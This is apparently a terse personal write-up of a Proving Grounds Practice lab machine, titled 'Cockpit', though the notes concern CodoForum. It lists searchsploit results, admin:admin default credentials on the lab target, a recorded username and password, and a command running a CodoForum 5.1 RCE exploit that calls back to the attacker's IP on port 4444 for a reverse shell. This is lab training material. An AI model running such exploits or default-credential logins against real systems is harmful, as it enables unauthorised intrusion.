---
layout: post
title:  "Write Up: Proving Grounds Practice - Cockpit"
date:   2024-07-29 16:53:42 -0400
categories: oscp proving-grounds TJNull
---


192.168.194.23
me - 

┌──(kali㉿kali)-[~/offsec/pg-practice/Codo]
└─$ searchsploit codoforum                       
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
CodoForum 2.5.1 - Arbitrary File Download                                         | php/webapps/36320.txt
CodoForum 3.2.1 - SQL Injection                                                   | php/webapps/40150.txt
CodoForum 3.3.1 - Multiple SQL Injections                                         | php/webapps/37820.txt
CodoForum 3.4 - Persistent Cross-Site Scripting                                   | php/webapps/40015.txt
Codoforum 4.8.3 - 'input_txt' Persistent Cross-Site Scripting                     | php/webapps/47886.txt
Codoforum 4.8.3 - Persistent Cross-Site Scripting                                 | php/webapps/47876.txt
CodoForum v5.1 - Remote Code Execution (RCE)                                      | php/webapps/50978.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


http://192.168.194.23/admin/index.php
admin : admin

Current version: V.5.1.105


jubjub
NFp$2Re@9@Jh9%f


python3 50978.py -t http://192.168.194.23/admin/index.php -u admin -p admin -i http://192.168.45.213 -n 4444